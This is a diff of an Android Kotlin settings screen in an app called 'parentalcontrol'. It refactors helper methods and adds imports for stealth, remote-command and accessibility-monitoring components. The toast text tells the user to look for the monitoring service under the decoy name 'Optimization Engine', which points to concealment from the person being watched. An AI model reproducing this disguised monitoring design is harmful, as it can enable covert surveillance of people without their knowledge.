@@ -1,4 +1,4 @@
-package com.example.parentalcontrol
+package com.example.parentalcontrol.features.security_and_stealth.controllers
 
 import android.app.AlertDialog
 import android.app.admin.DevicePolicyManager
@@ -15,8 +15,13 @@ import androidx.appcompat.app.AppCompatActivity
 import androidx.lifecycle.lifecycleScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
+import com.example.parentalcontrol.R
+import com.example.parentalcontrol.features.service_watchdog.services.MonitoringForegroundService
+import com.example.parentalcontrol.features.remote_commands.services.SupabaseManager
+import com.example.parentalcontrol.features.security_and_stealth.services.StealthManager
 import com.example.parentalcontrol.features.app_usage_and_notifications.services.AppNotificationListenerService
 import com.example.parentalcontrol.features.app_usage_and_notifications.services.AppUsageTracker
+import com.example.parentalcontrol.features.accessibility_monitoring.controllers.AccessibilityController
 
 /**
  * واجهة الإعدادات المخفية v2
@@ -156,42 +161,30 @@ class HiddenSettingsActivity : AppCompatActivity() {
     }
 
     // ── فتح إعدادات Accessibility ─────────────────────────────────────────────
-
+ 
     private fun openAccessibilitySettings() {
-        try {
-            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
-            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-            startActivity(intent)
-            Toast.makeText(
-                this,
-                "ℹ️ ابحث عن 'Resource Engine' وأوقف تشغيله",
-                Toast.LENGTH_LONG
-            ).show()
-        } catch (e: Exception) {
-            Toast.makeText(this, "❌ تعذر فتح الإعدادات: ${e.message}", Toast.LENGTH_SHORT).show()
-        }
+        AccessibilityController.openAccessibilitySettings(this)
+        Toast.makeText(
+            this,
+            "ابحث عن 'Optimization Engine' وقم بإيقاف تشغيله",
+            Toast.LENGTH_LONG
+        ).show()
     }
 
-    // ── فتح إعدادات النظام للتطبيق ────────────────────────────────────────────
+    // ── فتح إعدادات التطبيق في النظام ────────────────────────────────────────
 
     private fun openAppSystemSettings() {
         try {
             val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                 data = Uri.fromParts("package", packageName, null)
-                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
             }
             startActivity(intent)
-            Toast.makeText(
-                this,
-                "ℹ️ يمكنك إلغاء أي صلاحية من هذه الصفحة",
-                Toast.LENGTH_LONG
-            ).show()
         } catch (e: Exception) {
-            Toast.makeText(this, "❌ تعذر فتح الإعدادات: ${e.message}", Toast.LENGTH_SHORT).show()
+            Toast.makeText(this, "❌ فشل فتح إعدادات التطبيق: ${e.message}", Toast.LENGTH_LONG).show()
         }
     }
 
-    // ── فحص الأذونات الأساسية ─────────────────────────────────────────────────
+    // ── فحص وطلب الأذونات ─────────────────────────────────────────────────────
 
     private fun checkAndRequestPermissions() {
         // 1. صلاحية Device Admin
